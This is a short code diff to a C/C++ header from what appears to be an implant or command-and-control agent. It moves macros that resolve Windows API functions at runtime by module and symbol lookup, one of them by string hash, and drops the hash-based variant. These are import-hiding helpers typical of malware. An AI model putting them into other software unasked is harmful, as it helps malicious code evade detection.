@@ -37,10 +37,6 @@
 #define U32(x)                                  ((uint32_t)(x))
 #define U64(x)									((uint64_t)(x))
 
-#define FPTR(Fn, mod, sym) 						Fn = (__typeof__(Fn)) LdrGetSymbolAddress(mod, sym)
-#define FPTR2(Fn, mod, sym) 					Fn = (__typeof__(Fn)) LdrGetSymbolAddress(LdrGetModuleAddress(mod), sym)
-#define HASH_FPTR(mod, sym)						LdrGetSymbolAddress(LdrGetModuleAddress(GetHashFromString(mod, x_strlen((char*)mod))), GetHashFromString(sym, x_strlen((char*)sym)))
-
 #define LocalHeap								NtCurrentTeb()->ProcessEnvironmentBlock->ProcessHeap
 #define ntstatus 								Ctx->Teb->LastErrorValue
 
@@ -516,7 +512,12 @@ EXTERN_C LPVOID InstEnd();
 
 #define FreeApi(Ctx) 						\
 	auto Free = Ctx->Nt.RtlFreeHeap; 		\
-	x_memset(Ctx, 0, sizeof(HEXANE_CTX));  \
+	x_memset(Ctx, 0, sizeof(HEXANE_CTX));	\
 	Free(LocalHeap, 0, Ctx)
 
 
+#define FPTR(Fn, mod, sym) 	\
+	Fn = (__typeof__(Fn)) Memory::LdrGetSymbolAddress(mod, sym)
+
+#define FPTR2(Fn, mod, sym) \
+	Fn = (__typeof__(Fn)) Memory::LdrGetSymbolAddress(Memory::LdrGetModuleAddress(mod), sym)
